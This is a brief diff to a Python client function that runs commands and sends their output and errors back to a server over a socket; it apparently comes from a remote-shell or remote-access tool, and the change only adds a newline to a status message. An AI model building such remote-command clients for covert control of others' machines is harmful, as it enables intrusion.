@@ -358,7 +358,7 @@ def commandant(socket, delimiter):
         # Check if our output is empty
         if not len(output):
             # If empty tell the server there is no output
-            output = '{0}[!]{1} No command output at client'.format(turquoise, stop).encode()
+            output = '{0}[!]{1} No command output at client\n'.format(turquoise, stop).encode()
         # combine the bytes objects from the previous steps
         results = output + errors
         # now we send the results to the server
